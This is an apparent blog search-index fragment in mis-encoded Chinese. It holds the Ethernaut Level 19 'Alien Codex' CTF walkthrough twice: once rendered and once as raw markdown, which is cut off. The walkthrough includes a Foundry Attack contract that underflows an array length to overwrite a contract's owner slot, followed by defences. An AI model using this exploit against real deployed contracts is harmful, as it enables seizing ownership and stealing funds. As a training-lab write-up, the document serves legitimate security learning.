çš„æ¥æºå’ŒåŠŸèƒ½ã€‚</li>\n</ul>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>EVM Opcodes</strong>: EVMçš„æ“ä½œç æ˜¯å…¶æ‰§è¡Œæ‰€æœ‰è®¡ç®—çš„åŸºç¡€ã€‚<code>evm.codes</code> æ˜¯ä¸€ä¸ªæå¥½çš„äº¤äº’å¼å‚è€ƒç½‘ç«™ã€‚</li>\n<li><strong>å†…è”æ±‡ç¼– (<code>assembly</code>)</strong>: Solidityå…è®¸åœ¨ä»£ç ä¸­ç›´æ¥åµŒå…¥æ±‡ç¼–è¯­è¨€ï¼Œæä¾›äº†å¯¹EVMæ›´åº•å±‚çš„æ§åˆ¶ï¼Œä½†åŒæ—¶ä¹Ÿå¸¦æ¥äº†æ›´å¤§çš„é£é™©å’Œå¤æ‚æ€§ã€‚</li>\n<li><strong><code>create</code> æ“ä½œç </strong>: ç”¨äºä»ä»£ç ä¸­éƒ¨ç½²æ–°åˆçº¦ã€‚</li>\n<li><strong><code>extcodesize</code> æ“ä½œç </strong>: ç”¨äºè·å–ä¸€ä¸ªåœ°å€ä¸Šçš„ä»£ç å¤§å°ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åˆçº¦çš„å­—èŠ‚ç åˆ†ä¸º <code>creation code</code> å’Œ <code>runtime code</code>ã€‚</li>\n<li><code>creation code</code> åœ¨éƒ¨ç½²æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œå…¶è¿”å›å€¼æ˜¯ <code>runtime code</code>ã€‚</li>\n<li><code>runtime code</code> æ˜¯æ°¸ä¹…å­˜å‚¨åœ¨é“¾ä¸Šçš„ä»£ç ï¼Œå“åº”å¤–éƒ¨è°ƒç”¨ã€‚</li>\n<li>é€šè¿‡ç›´æ¥æ“ä½œEVMæ“ä½œç ï¼Œå¯ä»¥åˆ›å»ºå‡ºéå¸¸ç´§å‡‘å’Œé«˜æ•ˆçš„åˆçº¦ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡æ‰‹å†™æ±‡ç¼–ï¼Œç»•è¿‡é«˜çº§è¯­è¨€çš„é™åˆ¶ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„ä»£ç å¤§å°é™åˆ¶ï¼‰ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>åœ¨å®‰å…¨å®¡è®¡ä¸­ï¼Œä¸èƒ½å¿½è§†å¯¹åº•å±‚å­—èŠ‚ç å’Œæ±‡ç¼–çš„åˆ†æï¼Œç‰¹åˆ«æ˜¯å½“åˆçº¦è¡Œä¸ºä¸å¯»å¸¸æ—¶ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://www.evm.codes/\">EVM Codes - An Interactive Reference</a></li>\n<li><a href=\"https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737\">Deconstructing a Solidity Contract</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/assembly.html\">Solidity Docs: Inline Assembly</a></li>\n</ul>\n"},{"title":"Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ","date":"2025-01-25T08:40:00.000Z","updated":"2025-01-25T08:40:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"åˆ©ç”¨ Solidity 0.5.0 ç‰ˆæœ¬ä¸­çš„æ•´æ•°ä¸‹æº¢æ¼æ´ï¼Œå°†åŠ¨æ€æ•°ç»„çš„é•¿åº¦æ‰©å±•åˆ°æ•´ä¸ªåˆçº¦å­˜å‚¨ç©ºé—´ã€‚é€šè¿‡ç²¾ç¡®è®¡ç®—å­˜å‚¨æ§½ä½ï¼Œå®ç°å¯¹ `owner` å˜é‡çš„è¦†ç›–ï¼ŒæŒæ¡ Alien Codex å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 19 - Alien Codex](https://ethernaut.openzeppelin.com/level/19)  \n> **æ”»å‡»ç±»å‹**: å­˜å‚¨æ“çºµ / æ•´æ•°ä¸‹æº¢  \n> **éš¾åº¦**: â­â­â­â­â­\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯è·å– `AlienCodex` åˆçº¦çš„æ‰€æœ‰æƒã€‚è¿™æ˜¯ä¸€ä¸ªç»§æ‰¿äº† `Ownable` çš„åˆçº¦ï¼Œ`owner` å­˜å‚¨åœ¨ slot 0ã€‚\n\n![Alien Codex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n`AlienCodex` åˆçº¦ä½¿ç”¨äº†ä¸€ä¸ªæ—§çš„ Solidity ç‰ˆæœ¬ (`^0.5.0`)ï¼Œè¿™æ„å‘³ç€æ•´æ•°æ“ä½œä¸ä¼šè¿›è¡Œæº¢å‡ºæ£€æŸ¥ã€‚è¿™æ˜¯æœ¬å…³çš„æ ¸å¿ƒæ¼æ´ã€‚åˆçº¦çš„å­˜å‚¨å¸ƒå±€å¦‚ä¸‹ï¼š\n\n| Slot | å˜é‡å    | ç±»å‹        | è¯´æ˜                                     |\n| :--- | :-------- | :---------- | :--------------------------------------- |\n| 0    | `contact` | `bool`      | ä¸ `owner` æ‰“åŒ…åœ¨åŒä¸€ä¸ªæ§½ä½              |\n| 0    | `owner`   | `address`   | ç»§æ‰¿è‡ª `Ownable`ï¼Œä½äº slot 0            |\n| 1    | `codex`   | `bytes32[]` | åŠ¨æ€æ•°ç»„ï¼Œslot 1 å­˜å‚¨å…¶é•¿åº¦              |\n\nåˆçº¦ä¸­çš„å‡½æ•°éƒ½å—åˆ° `contacted` ä¿®é¥°ç¬¦çš„é™åˆ¶ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆè°ƒç”¨ `makeContact()` å°† `contact` è®¾ç½®ä¸º `true`ã€‚\n\nå…³é”®æ¼æ´åœ¨ `retract()` å‡½æ•°ä¸­ï¼š\n\n```solidity\n// From AlienCodex.sol (Solidity v0.5.0)\nfunction retract() public contacted {\n    codex.length--;\n}\n```\n\nç”±äºæ²¡æœ‰æº¢å‡ºæ£€æŸ¥ï¼Œå¦‚æœ `codex.length` ä¸º0ï¼Œæ‰§è¡Œ `codex.length--` ä¼šå¯¼è‡´æ•´æ•°ä¸‹æº¢ï¼Œä½¿å…¶é•¿åº¦å˜ä¸º `2**256 - 1`ã€‚ä¸€ä¸ªé•¿åº¦ä¸º `2**256 - 1` çš„åŠ¨æ€æ•°ç»„å¯ä»¥è¦†ç›–æ•´ä¸ªåˆçº¦çš„å­˜å‚¨ç©ºé—´ï¼\n\næ‹¥æœ‰ä¸€ä¸ªå¯ä»¥å†™åˆ°ä»»æ„å­˜å‚¨ä½ç½®çš„æ•°ç»„åï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è¦†ç›– slot 0 ä¸­çš„ `owner` å˜é‡ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å“ªä¸ªæ•°ç»„ç´¢å¼• `i` å¯¹åº”äºå­˜å‚¨æ§½ `0`ã€‚\n\nåŠ¨æ€æ•°ç»„çš„æ•°æ®å­˜å‚¨ä½ç½®æ˜¯ä» `keccak256(p)` å¼€å§‹çš„ï¼Œå…¶ä¸­ `p` æ˜¯æ•°ç»„é•¿åº¦æ‰€åœ¨çš„æ§½ä½ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œ`codex` çš„é•¿åº¦å­˜å‚¨åœ¨ slot 1ï¼Œæ‰€ä»¥å®ƒçš„æ•°æ®èµ·å§‹ä½ç½®æ˜¯ `keccak256(1)`ã€‚\n\n-   `codex[0]` å­˜å‚¨åœ¨ `keccak256(1)`\n-   `codex[i]` å­˜å‚¨åœ¨ `keccak256(1) + i`\n\næˆ‘ä»¬æƒ³å†™å…¥çš„ä½ç½®æ˜¯ slot 0ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç´¢å¼• `i`ï¼Œä½¿å¾— `keccak256(1) + i` åœ¨ `2**256` çš„æ¨¡è¿ç®—ä¸‹ç­‰äº `0`ã€‚\n\n`keccak256(1) + i = 2**256`\n`i = 2**256 - keccak256(1)`\n\nä¸€æ—¦æˆ‘ä»¬è®¡ç®—å‡ºè¿™ä¸ªç´¢å¼• `i`ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ `revise(i, our_address)` æ¥å°† `owner` ä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næ”»å‡»åˆçº¦å°†æ‰§è¡Œä¸Šè¿°çš„ä¸‰ä¸ªæ­¥éª¤ï¼šå»ºç«‹è”ç³»ã€è§¦å‘ä¸‹æº¢ã€è®¡ç®—ç´¢å¼•å¹¶ä¿®æ”¹ `owner`ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/19_AlienCodex.sol\";\n\ncontract AlienCodexTest is Test {\n    AlienCodex instance;\n    Attack attacker;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new AlienCodex();\n        assertNotEq(instance.owner(), player);\n        attacker = new Attack(address(instance));\n    }\n\n    function testAttack() public {\n        vm.startPrank(player);\n        attacker.attack();\n        vm.stopPrank();\n        assertEq(instance.owner(), player);\n    }\n}\n\ncontract Attack {\n    AlienCodex public instance;\n\n    constructor(address _instanceAddress) {\n        instance = AlienCodex(_instanceAddress);\n    }\n\n    function attack() public {\n        // 1. æˆä¸ºè”ç³»äººï¼Œç»•è¿‡ modifier\n        instance.makeContact();\n\n        // 2. è°ƒç”¨ retract() è§¦å‘æ•°ç»„é•¿åº¦ä¸‹æº¢\n        instance.retract();\n\n        // 3. è®¡ç®—è¦†ç›– slot 0 æ‰€éœ€çš„ç´¢å¼•\n        uint256 slot0_index;\n        unchecked {\n            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;\n        }\n\n        // 4. è°ƒç”¨ revise() å°† owner ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„åœ°å€\n        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è°ƒç”¨ `makeContact()`**: è§£é™¤å¯¹å…¶ä»–å‡½æ•°çš„è°ƒç”¨é™åˆ¶ã€‚\n2.  **è°ƒç”¨ `retract()`**: åœ¨ `codex` æ•°ç»„ä¸ºç©ºæ—¶è°ƒç”¨ï¼Œåˆ©ç”¨æ•´æ•°ä¸‹æº¢å°†æ•°ç»„é•¿åº¦å˜ä¸º `type(uint256).max`ã€‚\n3.  **è®¡ç®—ç›®æ ‡ç´¢å¼•**: è®¡ç®—å‡ºèƒ½è®©æ•°ç»„è®¿é—®â€œç¯ç»•â€åˆ°å­˜å‚¨æ§½0çš„ç´¢å¼• `i = 2**256 - keccak256(1)`ã€‚\n4.  **è°ƒç”¨ `revise()`**: ä½¿ç”¨è®¡ç®—å‡ºçš„ç´¢å¼•å’Œ `player` çš„åœ°å€ä½œä¸ºå‚æ•°è°ƒç”¨ `revise`ï¼Œè¿™ä¼šè¦†ç›– slot 0 çš„å†…å®¹ï¼Œä»è€Œæ”¹å˜ `owner`ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **ä½¿ç”¨å®‰å…¨çš„Solidityç‰ˆæœ¬**: ä» `0.8.0` ç‰ˆæœ¬å¼€å§‹ï¼ŒSolidity é»˜è®¤ä¼šå¯¹æ‰€æœ‰ç®—æœ¯è¿ç®—è¿›è¡Œä¸Šæº¢å’Œä¸‹æº¢æ£€æŸ¥ã€‚è¿™æ˜¯é˜²æ­¢æ­¤ç±»æ¼æ´æœ€ç®€å•ã€æœ€æœ‰æ•ˆçš„æ–¹æ³•ã€‚\n2.  **ä½¿ç”¨ `SafeMath` åº“**: å¦‚æœå¿…é¡»ä½¿ç”¨æ—§ç‰ˆæœ¬çš„Solidityï¼Œåº”å§‹ç»ˆä½¿ç”¨ `SafeMath` æˆ–ç±»ä¼¼çš„åº“æ¥æ‰§è¡Œæ‰€æœ‰ç®—æœ¯è¿ç®—ï¼Œä»¥é˜²æ­¢æº¢å‡ºã€‚\n3.  **è°¨æ…å¤„ç†åŠ¨æ€æ•°ç»„**: åŠ¨æ€æ•°ç»„çš„å­˜å‚¨ç®¡ç†å¾ˆå¤æ‚ã€‚åº”é¿å…å…è®¸ç”¨æˆ·ç›´æ¥æ§åˆ¶å¯èƒ½å¯¼è‡´å­˜å‚¨å†²çªçš„æ“ä½œï¼Œå¦‚æ— é™åˆ¶åœ°å¢åŠ æˆ–å‡å°‘æ•°ç»„é•¿åº¦ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **æ•´æ•°æº¢å‡º (Overflow/Underflow)**: åœ¨æ—§ç‰ˆæœ¬Solidityä¸­ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ç±»åˆ«ã€‚å½“ä¸€ä¸ªæ•´æ•°å˜é‡å¢åŠ è¶…è¿‡å…¶æœ€å¤§å€¼ï¼ˆä¸Šæº¢ï¼‰æˆ–å‡å°‘åˆ°å°äºå…¶æœ€å°å€¼ï¼ˆä¸‹æº¢ï¼‰æ—¶å‘ç”Ÿã€‚\n-   **åŠ¨æ€æ•°ç»„çš„å­˜å‚¨å¸ƒå±€**: ç†è§£åŠ¨æ€æ•°ç»„çš„é•¿åº¦å’Œæ•°æ®æ˜¯å¦‚ä½•åœ¨å­˜å‚¨ä¸­å¸ƒå±€çš„ï¼Œæ˜¯å‘ç°å’Œåˆ©ç”¨å­˜å‚¨æ“çºµæ¼æ´çš„å…³é”®ã€‚\n-   **`keccak256`**: EVMä¸­ç”¨äºè®¡ç®—å“ˆå¸Œçš„æ ¸å¿ƒå‡½æ•°ï¼Œå®ƒåœ¨ç¡®å®šå­˜å‚¨ä½ç½®æ—¶æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚\n-   **Foundry `unchecked`**: åœ¨Solidity `^0.8.0` ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ `unchecked` å—æ¥æ•…æ„å…è®¸æº¢å‡ºï¼Œè¿™åœ¨å¤ç°æ—§ç‰ˆæœ¬æ¼æ´æˆ–è¿›è¡Œç‰¹å®šä½æ“ä½œæ—¶å¾ˆæœ‰ç”¨ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   æ—§ç‰ˆSolidityï¼ˆ<0.8.0ï¼‰çš„æ•´æ•°è¿ç®—é»˜è®¤ä¸æ£€æŸ¥æº¢å‡ºã€‚\n-   åŠ¨æ€æ•°ç»„çš„é•¿åº¦å¯ä»¥è¢«æ“çºµï¼Œä»¥è®¿é—®åˆçº¦çš„æ•´ä¸ª256ä½å­˜å‚¨ç©ºé—´ã€‚\n-   åˆçº¦çš„å­˜å‚¨æ§½ä½å¯ä»¥é€šè¿‡ `keccak256` å“ˆå¸Œè¿›è¡Œç¡®å®šæ€§è®¡ç®—ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡æ•´æ•°ä¸‹æº¢ä¸€ä¸ªåŠ¨æ€æ•°ç»„çš„é•¿åº¦ï¼Œè·å¾—å¯¹åˆçº¦ä»»æ„å­˜å‚¨ä½ç½®çš„å†™æƒé™ã€‚\n-   è®¡ç®—å‡ºæŒ‡å‘ `owner` å˜é‡æ‰€åœ¨å­˜å‚¨æ§½ï¼ˆslot 0ï¼‰çš„æ•°ç»„ç´¢å¼•ã€‚\n-   è°ƒç”¨æ•°ç»„çš„å†™å‡½æ•°ï¼ˆ`revise`ï¼‰æ¥è¦†ç›– `owner`ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   å§‹ç»ˆä½¿ç”¨æœ€æ–°çš„ã€å®‰å…¨çš„Solidityç‰ˆæœ¬ã€‚\n-   å¦‚æœä½¿ç”¨æ—§ç‰ˆæœ¬ï¼Œå¿…é¡»ä½¿ç”¨ `SafeMath`ã€‚\n-   å¯¹æ‰€æœ‰å¤–éƒ¨è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å½±å“çŠ¶æ€å˜é‡ï¼ˆå¦‚æ•°ç»„é•¿åº¦ï¼‰çš„è¾“å…¥ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: Mapping and Dynamic Arrays](https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays)\n-   [Consensys: Integer Overflow and Underflow](https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/)","source":"_posts/ethernaut-level-19-alien-codex.md","raw":"---\ntitle: 'Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ'\ndate: 2025-01-25 16:40:00\nupdated: 2025-01-25 16:40:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - Storage Manipulation\n  - Array Underflow\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"åˆ©ç”¨ Solidity 0.5.0 ç‰ˆæœ¬ä¸­çš„æ•´æ•°ä¸‹æº¢æ¼æ´ï¼Œå°†åŠ¨æ€æ•°ç»„çš„é•¿åº¦æ‰©å±•åˆ°æ•´ä¸ªåˆçº¦å­˜å‚¨ç©ºé—´ã€‚é€šè¿‡ç²¾ç¡®è®¡ç®—å­˜å‚¨æ§½ä½ï¼Œå®ç°å¯¹ `owner` å˜é‡çš„è¦†ç›–ï¼ŒæŒæ¡ Alien Codex å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 19: Alien Codex - åŠ¨æ€æ•°ç»„å­˜å‚¨æ“çºµ\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 19 - Alien Codex](https://ethernaut.openzeppelin.com/level/19)  \n> **æ”»å‡»ç±»å‹**: å­˜å‚¨æ“çºµ / æ•´æ•°ä¸‹æº¢  \n> **éš¾åº¦**: â­â­â­â­â­\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯è·å– `AlienCodex` åˆçº¦çš„æ‰€æœ‰æƒã€‚è¿™æ˜¯ä¸€ä¸ªç»§æ‰¿äº† `Ownable` çš„åˆçº¦ï¼Œ`owner` å­˜å‚¨åœ¨ slot 0ã€‚\n\n![Alien Codex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n`AlienCodex` åˆçº¦ä½¿ç”¨äº†ä¸€ä¸ªæ—§çš„ Solidity ç‰ˆæœ¬ (`^0.5.0`)ï¼Œè¿™æ„å‘³ç€æ•´æ•°æ“ä½œä¸ä¼šè¿›è¡Œæº¢å‡ºæ£€æŸ¥ã€‚è¿™æ˜¯æœ¬å…³çš„æ ¸å¿ƒæ¼æ´ã€‚åˆçº¦çš„å­˜å‚¨å¸ƒå±€å¦‚ä¸‹ï¼š\n\n| Slot | å˜é‡å    | ç±»å‹        | è¯´æ˜                                     |\n| :--- | :-------- | :---------- | :--------------------------------------- |\n| 0    | `contact` | `bool`      | ä¸ `owner` æ‰“åŒ…åœ¨åŒä¸€ä¸ªæ§½ä½              |\n| 0    | `owner`   | `address`   | ç»§æ‰¿è‡ª `Ownable`ï¼Œä½äº slot 0            |\n| 1    | `codex`   | `bytes32[]` | åŠ¨æ€æ•°ç»„ï¼Œslot 1 å­˜å‚¨å…¶é•¿åº¦              |\n\nåˆçº¦ä¸­çš„å‡½æ•°éƒ½å—åˆ° `contacted` ä¿®é¥°ç¬¦çš„é™åˆ¶ï¼Œæˆ‘ä»¬å¿…é¡»å…ˆè°ƒç”¨ `makeContact()` å°† `contact` è®¾ç½®ä¸º `true`ã€‚\n\nå…³é”®æ¼æ´åœ¨ `retract()` å‡½æ•°ä¸­ï¼š\n\n```solidity\n// From AlienCodex.sol (Solidity v0.5.0)\nfunction retract() public contacted {\n    codex.length--;\n}\n```\n\nç”±äºæ²¡æœ‰æº¢å‡ºæ£€æŸ¥ï¼Œå¦‚æœ `codex.length` ä¸º0ï¼Œæ‰§è¡Œ `codex.length--` ä¼šå¯¼è‡´æ•´æ•°ä¸‹æº¢ï¼Œä½¿å…¶é•¿åº¦å˜ä¸º `2**256 - 1`ã€‚ä¸€ä¸ªé•¿åº¦ä¸º `2**256 - 1` çš„åŠ¨æ€æ•°ç»„å¯ä»¥è¦†ç›–æ•´ä¸ªåˆçº¦çš„å­˜å‚¨ç©ºé—´ï¼\n\næ‹¥æœ‰ä¸€ä¸ªå¯ä»¥å†™åˆ°ä»»æ„å­˜å‚¨ä½ç½®çš„æ•°ç»„åï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è¦†ç›– slot 0 ä¸­çš„ `owner` å˜é‡ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°å“ªä¸ªæ•°ç»„ç´¢å¼• `i` å¯¹åº”äºå­˜å‚¨æ§½ `0`ã€‚\n\nåŠ¨æ€æ•°ç»„çš„æ•°æ®å­˜å‚¨ä½ç½®æ˜¯ä» `keccak256(p)` å¼€å§‹çš„ï¼Œå…¶ä¸­ `p` æ˜¯æ•°ç»„é•¿åº¦æ‰€åœ¨çš„æ§½ä½ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œ`codex` çš„é•¿åº¦å­˜å‚¨åœ¨ slot 1ï¼Œæ‰€ä»¥å®ƒçš„æ•°æ®èµ·å§‹ä½ç½®æ˜¯ `keccak256(1)`ã€‚\n\n-   `codex[0]` å­˜å‚¨åœ¨ `keccak256(1)`\n-   `codex[i]` å­˜å‚¨åœ¨ `keccak256(1) + i`\n\næˆ‘ä»¬æƒ³å†™å…¥çš„ä½ç½®æ˜¯ slot 0ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç´¢å¼• `i`ï¼Œä½¿å¾— `keccak256(1) + i` åœ¨ `2**256` çš„æ¨¡è¿ç®—ä¸‹ç­‰äº `0`ã€‚\n\n`keccak256(1) + i = 2**256`\n`i = 2**256 - keccak256(1)`\n\nä¸€æ—¦æˆ‘ä»¬è®¡ç®—å‡ºè¿™ä¸ªç´¢å¼• `i`ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ `revise(i, our_address)` æ¥å°† `owner` ä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næ”»å‡»åˆçº¦å°†æ‰§è¡Œä¸Šè¿°çš„ä¸‰ä¸ªæ­¥éª¤ï¼šå»ºç«‹è”ç³»ã€è§¦å‘ä¸‹æº¢ã€è®¡ç®—ç´¢å¼•å¹¶ä¿®æ”¹ `owner`ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/19_AlienCodex.sol\";\n\ncontract AlienCodexTest is Test {\n    AlienCodex instance;\n    Attack attacker;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new AlienCodex();\n        assertNotEq(instance.owner(), player);\n        attacker = new Attack(address(instance));\n    }\n\n    function testAttack() public {\n        vm.startPrank(player);\n        attacker.attack();\n        vm.stopPrank();\n        assertEq(instance.owner(), player);\n    }\n}\n\ncontract Attack {\n    AlienCodex public instance;\n\n    constructor(address _instanceAddress) {\n        instance = AlienCodex(_instanceAddress);\n    }\n\n    function attack() public {\n        // 1. æˆä¸ºè”ç³»äººï¼Œç»•è¿‡ modifier\n        instance.makeContact();\n\n        // 2. è°ƒç”¨ retract() è§¦å‘æ•°ç»„é•¿åº¦ä¸‹æº¢\n        instance.retract();\n\n        // 3. è®¡ç®—è¦†ç›– slot 0 æ‰€éœ€çš„ç´¢å¼•\n        uint256 slot0_index;\n        unchecked {\n            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;\n        }\n\n        // 4. è°ƒç”¨ revise() å°† owner ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„åœ°å€\n        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è°ƒç”¨ `makeContact()`**: è§£é™¤å¯¹å…¶ä»–å‡½æ•°çš„è°ƒç”¨é™åˆ¶ã€‚\n2.  **è°ƒç”¨ `retract()`**: åœ¨ `codex` æ•°ç»„ä¸ºç©ºæ—¶è°ƒç”¨ï¼Œåˆ©ç”¨æ•´æ•°ä¸‹æº¢å°†æ•°ç»„é•¿åº¦å˜ä¸º `type(uint256).max`ã€‚\n3.  **è®¡ç®—ç›®æ ‡ç´¢å¼•**: è®¡ç®—å‡ºèƒ½è®©æ•°ç»„è®¿é—®â€œç¯ç»•â€åˆ°å­˜å‚¨æ§½0çš„ç´¢å¼• `i = 2**256 - keccak256(1)`ã€‚\n4.  **è°ƒç”¨ `revise()`**: ä½¿ç”¨è®¡ç®—å‡ºçš„ç´¢å¼•å’Œ `player` çš„åœ°å€ä½œä¸ºå‚æ•°è°ƒç”¨ `revise`ï¼Œè¿™ä¼šè¦†ç›– slot 0 çš„å†…å®¹ï¼Œä»è€Œæ”¹å˜ `owner`ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **ä½¿ç”¨å®‰å…¨çš„Solidityç‰ˆæœ¬**: ä» `0.8.0` ç‰ˆæœ¬å¼€å§‹ï¼ŒSolidity é»˜è®¤ä¼šå¯¹æ‰€æœ‰ç®—æœ¯è¿ç®—è¿›è¡Œä¸Šæº¢å’Œä¸‹æº¢æ£€æŸ¥ã€‚è¿™æ˜¯é˜²æ­¢æ­¤ç±»æ¼æ´æœ€ç®€å•ã€æœ€æœ‰æ•ˆçš„æ–¹æ³•ã€‚\n2.  **ä½¿ç”¨ `SafeMath` åº“**: å¦‚æœå¿…é¡»ä½¿ç”¨æ—§ç‰ˆæœ¬çš„Solidityï¼Œåº”å§‹ç»ˆä½¿ç”¨ `SafeMath` æˆ–ç±»ä¼¼çš„åº“æ¥æ‰§è¡Œæ‰€æœ‰ç®—æœ¯è¿ç®—ï¼Œä»¥é˜²æ­¢æº¢å‡ºã€‚\n3.  **è°¨æ…å¤„ç†åŠ¨æ€æ•°ç»„**: åŠ¨æ€æ•°ç»„çš„å­˜å‚¨ç®¡ç†å¾ˆå¤æ‚ã€‚åº”é¿å…å…è®¸ç”¨æˆ·ç›´æ¥æ§åˆ¶å¯èƒ½å¯¼è‡´å­˜å‚¨å†²çªçš„æ“ä½œï¼Œå¦‚æ— é™åˆ¶åœ°å¢åŠ æˆ–å‡å°‘æ•°ç»„é•¿åº¦ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **æ•´æ•°æº¢å‡º (Overflow/Underflow)**: åœ¨æ—§ç‰ˆæœ¬Solidityä¸­ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ç±»åˆ«ã€‚å½“ä¸€ä¸ªæ•´æ•°å˜é‡å¢åŠ è¶…è¿‡å…¶æœ€å¤§å€¼ï¼ˆä¸Šæº¢ï¼‰æˆ–å‡å°‘åˆ°å°äºå…¶æœ€å°å€¼ï¼ˆä¸‹æº¢ï¼‰æ—¶å‘ç”Ÿã€‚\n-   **åŠ¨æ€æ•°ç»„çš„å­˜å‚¨å¸ƒå±€**: ç†è§£åŠ¨æ€æ•°ç»„çš„é•¿åº¦å’Œæ•°æ®æ˜¯å¦‚ä½•åœ¨å­˜å‚¨ä¸­å¸ƒå±€çš„ï¼Œæ˜¯å‘ç°å’Œåˆ©ç”¨å­˜å‚¨æ“çºµæ¼æ´çš„å…³é”®ã€‚\n-   **`keccak256`**: EVMä¸­ç”¨äºè®¡ç®—å“ˆå¸Œçš„æ 